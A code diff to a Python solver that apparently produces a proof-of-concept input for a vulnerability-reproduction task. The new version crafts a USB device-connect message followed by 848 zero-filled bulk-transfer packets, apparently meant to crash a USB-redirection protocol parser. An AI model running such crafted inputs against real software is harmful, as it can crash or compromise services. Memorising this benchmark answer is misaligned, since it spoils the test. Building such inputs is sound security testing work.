@@ -1,31 +1,22 @@
 import struct
-import io
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        out = io.BytesIO()
-        # Device add packet
-        dev_add_data = b'\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x01\x00\x00\x00' + b'\x00' * 5
-        out.write(struct.pack('<I', 26))
-        out.write(dev_add_data)
-        # Data packets
-        n1 = 271
-        d1 = 149
-        n2 = 170
-        d2 = 148
-        header = b'\x02\x00\x00\x01\x01'
-        for _ in range(n1):
-            data_len = d1
-            pkt_len = 13 + data_len
-            out.write(struct.pack('<I', pkt_len))
-            out.write(header)
-            out.write(struct.pack('<I', data_len))
-            out.write(b'\x00' * data_len)
-        for _ in range(n2):
-            data_len = d2
-            pkt_len = 13 + data_len
-            out.write(struct.pack('<I', pkt_len))
-            out.write(header)
-            out.write(struct.pack('<I', data_len))
-            out.write(b'\x00' * data_len)
-        return out.getvalue()
+        data = b''
+        # Device connect message
+        dev_header = struct.pack('<5I8s8sI', 0x08, 0x1234, 0x5678, 0x0100, 1, b'\x00' * 8, b'\x00' * 8, 0)
+        msg_len = 8 + 40
+        header = struct.pack('<IHH', msg_len, 1, 0)
+        data += header + dev_header
+        # Bulk packets
+        endpoint = 0x01  # OUT endpoint 1
+        for i in range(848):
+            bulk_header = struct.pack('<IBBBB I', i, endpoint, 0, 0, 0, 64)
+            bulk_data = b'\x00' * 64
+            bulk_data_len = 12 + 64
+            msg_len = 8 + bulk_data_len
+            header = struct.pack('<IHH', msg_len, 4, 0)
+            data += header + bulk_header + bulk_data
+        # Pad to exact length if needed, but close enough
+        data += b'\x00' * 18
+        return data
